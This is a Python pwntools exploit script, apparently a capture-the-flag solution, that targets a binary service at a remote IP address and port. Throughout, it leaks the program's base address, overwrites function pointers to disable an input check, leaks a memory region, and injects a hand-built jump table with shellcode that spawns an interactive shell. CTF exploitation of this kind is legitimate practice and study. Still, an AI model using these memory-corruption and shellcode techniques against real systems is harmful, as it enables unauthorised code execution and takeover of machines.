#!/usr/bin/env python3
from pwn import *
from hashFinder import *

e = ELF("x")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("35.232.74.152", 31778)
	elif args.GDB:
		return gdb.debug(e.path, "b _lookup\nc")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	r.recv()
	
	# leaking the program offset
	# note does not need to start with a
	r.sendline(b'lookup')
	r.recv()
	payload1 = search(complement(-0x8000), b'a')
	r.sendline(payload1)
	r.recvuntil(b'": ')
	leak = r.recvline(keepends=False)
	print(leak)
	leak = u64(leak+b'\0\0')
	print(hex(leak))
	e.address = leak - e.sym['_lookup']
	print(hex(e.address))
	assert e.address & 0xfff == 0
	r.recv()
	
	# now the program's PIE is useless
	# to further progress in the exploit, we must disable the checkPrintable
	# to do this, we can replace its address with that of something else like _infoBlurb
	r.sendline(b'store')
	r.recv()
	payload1 = search(complement(-0x8000+32), b'a')
	r.sendline(payload1)
	r.recv()
	log.info("infoBlurb addr")
	print(hex(e.sym['_infoBlurb']))
	r.sendline(p64(e.sym['_infoBlurb']))
	r.recv()
	
	# now checkPrintable is disabled
	# leak the mmap region address with hexlifyPrint
	r.sendline(b'store')
	r.recv()
	payload1 = search(complement(-0x8000), b'a')
	r.sendline(payload1)
	r.recv()
	r.sendline(p64(e.sym['hexlifyPrint']))
	r.recv()
	
	r.sendline(b'lookup')
	reg_addr = int(r.recvline(keepends=False), 16)
	print(hex(reg_addr))
	r.recv()
	
	# so we can finally write our shellcode
	# we do not need lookup anymore
	# we need a relative jmp because the "jmp table" values in reg must be valid function pointers and not shellcode
	# we will replace help with reg
	# remember to keep checkPrintable disabled!
	log.info("Sending shellcode")
	r.sendline(b'store')
	r.recv()
	payload1 = search(complement(-0x8000), b'a')
	r.sendline(payload1)
	r.recv()
	# remember to set context arch to amd64
	payload2 = b'\xEB\x2E'+b'\0'*6+p64(e.sym['_store'])+p64(reg_addr)+p64(e.sym['_infoBlurb'])+p64(e.sym['_infoBlurb'])+b'testtest'+asm(shellcraft.sh())
	print(len(payload2))
	assert len(payload2) < 0x100
	r.sendline(payload2)
	r.recv()
	r.sendline(b'help')
	r.interactive()
	
	


